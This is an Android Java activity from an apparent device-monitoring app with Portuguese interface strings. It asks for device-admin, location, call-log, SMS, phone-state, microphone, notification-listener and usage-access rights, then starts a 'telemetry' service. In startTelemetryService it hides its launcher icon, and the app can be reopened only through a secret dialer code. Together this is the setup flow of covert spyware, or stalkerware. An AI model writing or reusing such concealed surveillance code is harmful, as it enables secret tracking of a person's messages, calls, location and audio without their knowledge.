package com.company.devicemgr.activities;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Button;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.company.devicemgr.R;
import com.company.devicemgr.receivers.DeviceAdminReceiver;
import com.company.devicemgr.utils.AppRuntime;

import java.util.ArrayList;
import java.util.List;

public class MainPermissionsActivity extends Activity {
    Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia;
    TextView tvStatus, tvDeviceId;
    private static final int REQ_CODE_DEVICE_ADMIN = 1001;
    private static final int REQ_CODE_PERMS = 2001;
    private static final int REQ_PICK_MEDIA = 3001;
    private static final int ANDROID_13_API_LEVEL = 33;
    private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
    private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
    private static final String POST_NOTIFICATIONS_PERMISSION = "android.permission.POST_NOTIFICATIONS";

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        setContentView(R.layout.activity_main_permissions);

        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin);
        btnLocationPerm = findViewById(R.id.btnLocationPerm);
        btnStoragePerm = findViewById(R.id.btnStoragePerm);
        btnCallLogPerm = findViewById(R.id.btnCallLogPerm);
        btnSmsPerm = findViewById(R.id.btnSmsPerm);
        btnNotifAccess = findViewById(R.id.btnNotifAccess);
        btnUsageAccess = findViewById(R.id.btnUsageAccess);
        btnStartService = findViewById(R.id.btnStartService);
        btnPickMedia = findViewById(R.id.btnPickMedia);

        tvStatus = findViewById(R.id.tvStatus);
        tvDeviceId = findViewById(R.id.tvDeviceId);

        final SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        final String deviceId = sp.getString("deviceId", "não atribuído");
        tvDeviceId.setText("DeviceId: " + deviceId + "\nPacote: " + getPackageName());

        btnDeviceAdmin.setOnClickListener(v -> requestDeviceAdmin());
        btnLocationPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        }));
        btnStoragePerm.setOnClickListener(v -> requestPermissionsIfNeeded(getStoragePermissionsForCurrentVersion()));
        btnCallLogPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_CALL_LOG}));
        btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECORD_AUDIO
        }));
        btnNotifAccess.setOnClickListener(v -> openNotificationAccessSettings());
        btnUsageAccess.setOnClickListener(v -> openUsageAccessSettings());
        btnStartService.setOnClickListener(v -> confirmAndStartService(sp));
        btnPickMedia.setOnClickListener(v -> openDocumentPicker());

        updateStatusText();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatusText();
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComp = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm != null && !dpm.isAdminActive(adminComp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
            startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
        } else {
            showMsg("Device Admin já ativo");
        }
    }

    private String[] getStoragePermissionsForCurrentVersion() {
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            return new String[]{READ_MEDIA_IMAGES_PERMISSION, READ_MEDIA_VIDEO_PERMISSION};
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        }
        return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
    }

    private void openNotificationAccessSettings() {
        requestNotificationPermissionIfNeeded();
        Intent direct = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS)
                .putExtra(Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME,
                        new ComponentName(this, com.company.devicemgr.services.NotificationListenerSvc.class).flattenToString());
        if (direct.resolveActivity(getPackageManager()) != null) {
            startActivity(direct);
            showMsg("Abrindo acesso a notificações do app...");
            return;
        }
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        showMsg("Se o app não aparecer, procure por " + getPackageName());
    }

    private void openUsageAccessSettings() {
        Intent usageIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
        if (usageIntent.resolveActivity(getPackageManager()) != null) {
            startActivity(usageIntent);
        } else {
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
        }
        showMsg("Procure por " + getPackageName() + " e ative 'Acesso ao uso'.");
    }

    private void requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            requestPermissionsIfNeeded(new String[]{POST_NOTIFICATIONS_PERMISSION});
        }
    }

    private void confirmAndStartService(SharedPreferences sp) {
        boolean active = sp.getBoolean("active", false);
        if (!active) {
            new AlertDialog.Builder(this)
                    .setTitle("Aviso")
                    .setMessage("A conta pode não estar ativa. Continua?")
                    .setPositiveButton("Sim", (d, which) -> startTelemetryService())
                    .setNegativeButton("Não", null)
                    .show();
        } else {
            startTelemetryService();
        }
    }

    private void openDocumentPicker() {
        Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        i.addCategory(Intent.CATEGORY_OPENABLE);
        i.setType("*/*");
        i.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{"image/*", "video/*"});
        startActivityForResult(i, REQ_PICK_MEDIA);
    }

    private boolean hasUsageAccessPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
        if (appOps == null) return false;
        int mode;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            mode = appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
        } else {
            mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
        }
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private boolean isNotificationAccessEnabled() {
        String enabled = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (TextUtils.isEmpty(enabled)) return false;
        return enabled.contains(getPackageName());
    }

    private void startTelemetryService() {
        requestNotificationPermissionIfNeeded();
        AppRuntime.ensureTelemetryStarted(this);
        showMsg("Serviço iniciado");
        updateStatusText();

        getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("setup_completed", true).apply();
        AppRuntime.setLauncherVisible(this, false);
        new AlertDialog.Builder(this)
                .setTitle("Configuração concluída")
                .setMessage("Aplicação ocultada. Para reabrir, use o código no discador: *#*#8466#*#*")
                .setPositiveButton("OK", (d, w) -> finishAffinity())
                .show();
    }

    private void showMsg(String m) {
        tvStatus.setText("Status: " + m);
    }

    private void updateStatusText() {
        SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        String token = sp.getString("auth_token", null);
        String deviceId = sp.getString("deviceId", "não atribuído");
        List<String> states = new ArrayList<>();
        states.add("Token: " + (token != null ? "OK" : "ausente"));
        states.add("Notificações: " + (isNotificationAccessEnabled() ? "OK" : "pendente"));
        states.add("Uso do aparelho: " + (hasUsageAccessPermission() ? "OK" : "pendente"));
        states.add("Serviço: " + (sp.getBoolean("service_started", false) ? "ativo" : "parado"));
        tvStatus.setText(TextUtils.join("\n", states));
        tvDeviceId.setText("DeviceId: " + deviceId + "\nPacote: " + getPackageName());
    }

    private void requestPermissionsIfNeeded(String[] perms) {
        List<String> need = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }
        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ_CODE_PERMS);
        } else {
            showMsg("Permissões já concedidas");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE_DEVICE_ADMIN) {
            showMsg(resultCode == RESULT_OK ? "Device Admin ativado" : "Device Admin não ativado");
        } else if (requestCode == REQ_PICK_MEDIA && resultCode == RESULT_OK && data != null) {
            Uri uri = data.getData();
            if (uri != null) {
                showMsg("Media selecionada: " + uri);
                getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putString("last_media_uri", uri.toString()).apply();
            }
        }
        updateStatusText();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE_PERMS) {
            boolean ok = true;
            for (int r : grantResults) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    ok = false;
                    break;
                }
            }
            showMsg(ok ? "Permissões concedidas" : "Algumas permissões não concedidas");
            updateStatusText();
        }
    }
}
